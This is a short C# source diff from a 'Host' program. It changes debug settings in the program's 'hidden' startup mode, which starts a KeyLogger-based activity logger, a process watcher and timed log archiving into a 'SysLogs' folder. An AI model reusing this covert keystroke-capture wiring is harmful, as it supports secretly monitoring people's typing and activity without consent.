@@ -21,25 +21,22 @@ namespace Host
                 return;
             }
 
-            //if (args.Length > 0 && args[0] == "hidden")
-
-            if (true || args.Length > 0 && args[0] == "hidden")
+          
+            if ( args.Length > 0 && args[0] == "hidden")
             {
                 _logFolder = Path.Combine(GetRootFolderPath(), "SysLogs");
 
                 new UnhandledExceptionHandlercs().Register(ErrrorLogger.LogError);
 
-                //new LogFileArchiver(GetFileSystem(), GetArchiveLocation()).StartPurging(_logFolder, TimeSpan.FromMinutes(5));
+                new LogFileArchiver(GetFileSystem(), GetArchiveLocation()).StartPurging(_logFolder, TimeSpan.FromMinutes(5));
 
-                new LogFileArchiver(GetFileSystem(), GetArchiveLocation()).StartPurging(_logFolder, TimeSpan.FromSeconds(5));
+                //new LogFileArchiver(GetFileSystem(), GetArchiveLocation()).StartPurging(_logFolder, TimeSpan.FromSeconds(5));
 
                 var activityLogger = new ActivityLogger(TimeSpan.FromSeconds(2), _logFolder, new KeyLogger());
 
                 ProcessHelper.Watch();
 
                 activityLogger.StartLoging();
-
-               
             }
             else
             {
